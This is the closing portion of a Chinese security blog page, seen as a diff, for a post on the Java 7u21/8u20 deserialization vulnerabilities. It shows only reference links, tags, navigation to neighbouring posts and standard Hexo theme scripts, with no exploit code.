+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/Daipik5qK6cIuYl49G-n4Q">https://mp.weixin.qq.com/s/Daipik5qK6cIuYl49G-n4Q</a></p>
+<p><a href="https://github.com/pwntester/JRE8u20_RCE_Gadget">https://github.com/pwntester/JRE8u20_RCE_Gadget</a></p>
+<p><a href="https://www.freebuf.com/vuls/176672.html">https://www.freebuf.com/vuls/176672.html</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2020/11/10/Tomcat%E6%BA%90%E7%A0%81%E8%A7%82%E6%B5%8B/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>Tomcat源码观测</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2020/10/13/PHP-SplDoublyLinkedList-UAF-%E5%88%A9%E7%94%A8/">
+                        <span>PHP SplDoublyLinkedList UAF 利用</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Java 7u21/8u20 反序列化漏洞&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
